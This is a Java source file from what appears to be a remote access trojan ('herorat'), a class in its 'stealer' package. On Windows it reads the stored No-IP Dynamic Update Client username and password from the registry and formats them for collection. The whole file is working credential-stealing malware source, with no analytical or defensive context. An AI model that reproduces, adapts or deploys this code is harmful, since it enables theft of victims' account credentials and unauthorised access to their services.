package net.herorat.features.stealer;

public class StealerNoIp
{
	public static String getLogin()
	{
		String os = System.getProperty("os.name", "").toLowerCase();
		if (os.contains("win"))
		{
			if (Registry.readRegistry("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username") != null)
			{
				StringBuffer buffer = new StringBuffer();
				buffer.append("----------- NO-IP -----------\n");
				buffer.append("Username: ");
				buffer.append(Registry.readRegistry("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username"));
				buffer.append("\nPassword: ");
				buffer.append(Registry.readRegistry("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password"));
				buffer.append("\n-----------------------------\n\n");
				
				return buffer.toString();
			}
		}

		return "";
	}
}